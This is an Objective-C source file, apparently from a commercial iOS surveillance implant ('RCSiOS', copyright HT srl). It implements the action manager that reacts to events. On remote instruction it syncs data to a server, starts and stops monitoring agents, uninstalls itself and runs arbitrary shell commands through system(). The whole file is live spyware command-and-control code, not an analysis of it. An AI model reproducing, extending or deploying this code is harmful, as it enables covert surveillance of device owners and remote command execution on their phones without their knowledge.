/*
 * RCSiOS - Actions
 *  Provides all the actions which should be triggered upon an Event
 *
 *
 * Created on 11/06/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */
#import <mach/message.h>
#import <mach/mach.h>

#import "RCSIActionManager.h"
#import "RCSITaskManager.h"
#import "RESTNetworkProtocol.h"
#import "RCSICommon.h"
#import "RCSIInfoManager.h"
#import "RCSISharedMemory.h"
#import "RCSIThreadSupport.h"

//#define DEBUG_

NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";

@implementation RCSIActionManager

@synthesize notificationPort;

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

- (id)init
{
  self = [super init];
  
  if (self != nil)
    {
      // allocated here and never released: al max count == 0
      mActionsMessageQueue = [[NSMutableArray alloc] initWithCapacity:0];
      mThreadArray         = [[NSMutableArray alloc] initWithCapacity:0];
      notificationPort     = nil;
      actionManagerStatus  = ACTION_MANAGER_STOPPED;
      isSynching           = FALSE;
      actionsList          = nil;
    }
  
  return self;
}

- (void)dealloc 
{
  [actionsList release];
  [mActionsMessageQueue release];
  [mThreadArray release];
  [super dealloc];
}

#pragma mark -
#pragma mark Support methods
#pragma mark -

- (void)addThread:(RCSIThread*)aThread
{
  int count = [mThreadArray count] - 1;
  
  for (int i=count; i >= 0; i--) 
    {
      id thread = [mThreadArray objectAtIndex:i];
      if ([thread isFinished] == YES)
        [mThreadArray removeObjectAtIndex:i];
    }
  
  [mThreadArray addObject:aThread];
}

- (void)resetSynchFlag
{
  @synchronized(self)
  {
    if (isSynching == TRUE)
      isSynching = FALSE;
  }
}

- (BOOL)testAndSetSynchFlag
{
  BOOL success = FALSE;
  
  @synchronized(self)
  {
    if (isSynching == FALSE)
      {
        isSynching = TRUE;
        success = TRUE;
      }
  }
  
  return success;
}

- (NSArray *)getConfigForAction: (u_int)anActionID 
                       withFlag:(BOOL*)concurrent
{  
  NSArray *subactions = nil;  
  *concurrent = FALSE;
  
  if (anActionID > [actionsList count])
    return subactions;

  NSDictionary *subaction = [actionsList objectAtIndex:anActionID];

  if (subaction != nil)
    {
      subactions     = [subaction objectForKey:@"subactions"];
      NSNumber *flag = [subaction objectForKey:@"concurrent"];
  
      if (flag != nil && [flag boolValue] == TRUE)
        *concurrent = TRUE;
    }
  
  return subactions;
}

#pragma mark -
#pragma mark Action Dispatcher
#pragma mark -

- (BOOL)tryTriggerAction:(int)anActionID
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  BOOL concurrent = FALSE;
  
  if (anActionID == 0xFFFFFFFF)
    {
      [pool release];
      return FALSE;
    }
  
  NSArray *configArray = [self getConfigForAction: anActionID 
                                         withFlag: &concurrent];
  
  if (configArray == nil)
    {
      return FALSE;
    }
  else
    {
      if (concurrent == FALSE)
        {
          [self triggerAction: [configArray retain]];
        }
      else
        {
          RCSIThread *actionThread =  
                  [[RCSIThread alloc] initWithTarget: self
                                            selector: @selector(triggerAction:) 
                                              object: [configArray retain]
                                             andName: @"SYNC"];
        
          [self addThread: actionThread];
          
          [actionThread start];
          
          [actionThread release];
        }
    }
    
  [pool release];
  
  return TRUE;
}

- (BOOL)triggerAction: (NSArray*)configArray
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

  NSThread *currentThread = [NSThread currentThread];
  
  NSMutableDictionary *configuration;

  for (configuration in configArray)
    {
      if ([currentThread isCancelled] == TRUE)
        break;
    
      int32_t type = [[configuration objectForKey: @"type"] intValue];
    
      switch (type)
        {
          case ACTION_SYNC:
          {
            BOOL aRetVal = [self tryActionSync: configuration];
          
            NSNumber *stop = [configuration objectForKey: @"stop"];
            if (aRetVal == TRUE && stop != nil && [stop boolValue] == TRUE)
              {
                [configArray release];
                [pool release];
                return TRUE;
              }
            break;
          }
          case ACTION_AGENT_START:
          {    
            [self actionAgent: configuration start: TRUE];        
            break;
          }
          case ACTION_AGENT_STOP:
          {
            [self actionAgent: configuration start: FALSE];
            break;
          }
          case ACTION_UNINSTALL:
          {
            [self actionUninstall: configuration];       
            break;
          }
          case ACTION_INFO:
          {
            [self actionInfo: configuration];
            break;
          }
          case ACTION_COMMAND:
          {
            [self actionLaunchCommand: configuration];
            break;
          }
          case ACTION_EVENT:
          {
            [self actionEvent: configuration];
            break;
          }
          default:
          {
            break;
          }
        }
    }

  [configArray release];
  
  [pool release];
  
  return TRUE;
}

#pragma mark -
#pragma mark Actions
#pragma mark -

- (BOOL)tryActionSync:(NSMutableDictionary*)configuration
{
  BOOL aRetVal = FALSE;
  
  if (gAgentCrisis == NO && [self testAndSetSynchFlag] == TRUE) 
    {
      aRetVal = [self actionSync: configuration];
      [self resetSynchFlag];
    }
  
  return aRetVal;
}


- (BOOL)actionSync: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  BOOL aRetVal = TRUE;

  NSData *syncConfig = [aConfiguration objectForKey: @"data"];
  
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                   initWithConfiguration: syncConfig
                                                 andType: ACTION_SYNC];

  if ([protocol perform] == NO)
    {
      aRetVal = FALSE;
    }

  [protocol release];  
  [outerPool release];
  
  return aRetVal;
}

- (BOOL)actionAgent: (NSMutableDictionary *)aConfiguration 
              start: (BOOL)aFlag
{  
  u_int agentID = 0;
  
  [[aConfiguration objectForKey: @"data"] getBytes: &agentID];
  
  if (aFlag == TRUE)
    {
      [self dispatchMsgToCore: ACTION_START_AGENT param: agentID];
    }
   else
    {
      [self dispatchMsgToCore: ACTION_STOP_AGENT  param: agentID];
    }

  return TRUE;
}

- (BOOL)actionLaunchCommand: (NSMutableDictionary *)aConfiguration
{
  NSData *conf = [aConfiguration objectForKey: @"data"];
  
  NSString *cmdStr = [[NSString alloc] initWithBytes: [conf bytes] 
                                              length: [conf length] 
                                            encoding: NSUTF8StringEncoding];
  
  char *commandBuff = (char*)[cmdStr cStringUsingEncoding: NSUTF8StringEncoding];
  
  if (commandBuff != NULL)
    system(commandBuff);
  
  [cmdStr release];
  
  return TRUE;
}

- (BOOL)actionUninstall: (NSMutableDictionary *)aConfiguration
{
  [self dispatchMsgToCore: CORE_NOTIFICATION param: ACTION_DO_UNINSTALL];
  return TRUE;
}

- (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
{
  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];

  NSData *conf = [aConfiguration objectForKey: @"data"];

  int32_t len = 0;
  NSData *stringData;
  
  [conf getBytes: &len length: sizeof(int32_t)];
  
  @try
    {
      stringData = [conf subdataWithRange: NSMakeRange(sizeof(int32_t), len)];
    }
  @catch (NSException *e)
    {
      [aConfiguration release];
      return NO;
    }
    
  NSString *text = [[NSString alloc] initWithData: stringData
                                         encoding: NSUTF16LittleEndianStringEncoding];
  
  [infoManager logActionWithDescription: text];
  
  [text release];
  [infoManager release];

  return TRUE;
}

typedef struct {
  UInt32 enabled;
  UInt32 event;
} action_event_t;

- (BOOL)actionEvent: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  action_event_t *event = 
    (action_event_t*)[[aConfiguration objectForKey: @"data"] bytes];
  
  if (event != nil) 
    {
      if(event->enabled == TRUE)
        [self dispatchMsgToCore: ACTION_EVENT_ENABLED  param: event->event];
      else 
        [self dispatchMsgToCore: ACTION_EVENT_DISABLED param: event->event];
    }
  
  [pool release];
  
  return TRUE;
}

#pragma mark -
#pragma mark Main runloop
#pragma mark -

typedef struct _coreMessage_t
{
  mach_msg_header_t header;
  uint dataLen;
} coreMessage_t;

- (void)dispatchMsgToCore:(u_int)aType
                    param:(u_int)aParam
{
  shMemoryLog params;
  params.agentID  = aType;
  params.flag     = aParam;
  
  NSData *msgData = [[NSData alloc] initWithBytes: &params 
                                           length: sizeof(shMemoryLog)];
  
  [RCSISharedMemory sendMessageToCoreMachPort: msgData 
                                     withMode: kRunLoopActionManagerMode];
  
  [msgData release];
}

- (BOOL)addMessage: (NSData*)aMessage
{
  // messages removed by handleMachMessage
  @synchronized(mActionsMessageQueue)
  {
    [mActionsMessageQueue addObject: aMessage];
  }
  
  return TRUE;
}

// handle the incomings events
- (void) handleMachMessage:(void *) msg 
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  coreMessage_t *coreMsg = (coreMessage_t*)msg;
  
  NSData *theData = [NSData dataWithBytes: ((u_char*)msg + sizeof(coreMessage_t))  
                                   length: coreMsg->dataLen];
  
  [self addMessage: theData];
  
  [pool release];
}

- (BOOL)processAction:(NSData *)aData
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  if (aData == nil)
    return FALSE;
  
  shMemoryLog *anAction = (shMemoryLog*)[aData bytes];
  
  switch (anAction->agentID) 
  {
    case CORE_NOTIFICATION:
      {
        if (anAction->flag == CORE_NEED_RESTART || 
            anAction->flag == CORE_NEED_STOP)
          {
            actionManagerStatus = ACTION_MANAGER_STOPPING;
            [pool release];
            return FALSE;
          }
        break;
      }
    case EVENT_TRIGGER_ACTION:
      {
        [self tryTriggerAction: anAction->flag];
      }
  }
  [pool release];
  
  return TRUE;
}

-(int)processIncomingActions
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  NSMutableArray *tmpMessages;
  
  @synchronized(mActionsMessageQueue)
  {
    tmpMessages = [[mActionsMessageQueue copy] autorelease];
    [mActionsMessageQueue removeAllObjects];
  }

  int actionCount = [tmpMessages count];
  
  for (int i=0; i < actionCount; i++)
    if ([self processAction: [tmpMessages objectAtIndex:i]] == FALSE)
      {
        [pool release];
        return actionCount;
      }
  [pool release];
  
  return actionCount;
}

- (void)actionManagerRunLoop
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
    
  actionManagerStatus = ACTION_MANAGER_RUNNING;

  NSRunLoop *actionManagerRunLoop = [NSRunLoop currentRunLoop];
  
  notificationPort = [[NSMachPort alloc] init];
  [notificationPort setDelegate: self];
  
  [actionManagerRunLoop addPort: notificationPort 
                        forMode: kRunLoopActionManagerMode];
  
  while (actionManagerStatus == ACTION_MANAGER_RUNNING)
    {
      NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
      
      [actionManagerRunLoop runMode: kRunLoopActionManagerMode 
                         beforeDate: [NSDate dateWithTimeIntervalSinceNow:0.750]];
      
      [self processIncomingActions];   
      
      [pool release];
    }
  
  [actionManagerRunLoop removePort: notificationPort 
                           forMode: kRunLoopActionManagerMode];
  
  [notificationPort release];
  notificationPort = nil;
  
  @synchronized(mActionsMessageQueue)
  {
    [mActionsMessageQueue removeAllObjects];
  }
  
  [self stop];
  
  [pool release];
}

- (BOOL)start
{  
  actionsList = [[RCSIConfManager sharedInstance] actionsArrayConfig];
  
  if (actionsList == nil)
    return FALSE;
  
  [NSThread detachNewThreadSelector: @selector(actionManagerRunLoop) 
                           toTarget: self 
                         withObject: nil];
  
  return TRUE;
}

- (BOOL)yetRunningActions
{
  for (int i=0; i < [mThreadArray count]; i++) 
    {
    id thread = [mThreadArray objectAtIndex:i];
    
    if ([thread isExecuting] == TRUE)
      return TRUE;
    }
  
  return FALSE;
}

- (void)stopAllRunningActions
{  
  for (int i=0; i < [mThreadArray count]; i++) 
    {
      id thread = [mThreadArray objectAtIndex:i];
    
      if (thread != nil)
        {
          [thread cancel];
        }
    }
  
  do 
    {
      usleep(250000);
    } while ([self yetRunningActions] != FALSE);
  
}

- (void)stop
{
  [self stopAllRunningActions];
  [self dispatchMsgToCore: CORE_NOTIFICATION param: CORE_ACTION_STOPPED];
}

@end







#if 0
- (BOOL)actionSyncAPN: (NSMutableDictionary *)aConfiguration
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  [aConfiguration retain];
  
  NSData *syncConfig = [[aConfiguration objectForKey: @"data"] retain];
  RESTNetworkProtocol *protocol = [[RESTNetworkProtocol alloc]
                                   initWithConfiguration: syncConfig
                                   andType: ACTION_SYNC_APN];
  
  if ([protocol perform] == NO)
    {
#ifdef DEBUG_ACTIONS
    errorLog(@"An error occurred while syncing over APN with REST proto");
#endif
    }
  else
    {
    BOOL bSuccess = NO;
    
    RCSITaskManager *taskManager = [RCSITaskManager sharedInstance];
    
    NSMutableDictionary *agentConfiguration = [taskManager getConfigForAgent: AGENT_DEVICE];
    
    deviceStruct *tmpDevice = 
    (deviceStruct*)[[agentConfiguration objectForKey: @"data"] bytes];
    
    if (tmpDevice != nil &&
        tmpDevice->isEnabled == AGENT_DEV_ENABLED)
      {          
        bSuccess = [taskManager startAgent: AGENT_DEVICE];
        
#ifdef DEBUG
        NSLog(@"%s: sync performed... restarting DEVICE Agent %d", __FUNCTION__, bSuccess);
#endif
      }
    else
      {
#ifdef DEBUG
      NSLog(@"%s: sync performed... DEVICE Agent dont restarted", __FUNCTION__);
#endif
      }
    }
  
  NSNumber *status = [NSNumber numberWithInt: 0];
  [aConfiguration setObject: status forKey: @"status"];
  
  [protocol release];  
  [aConfiguration release];
  [outerPool release];
  
  return YES;
}
#endif
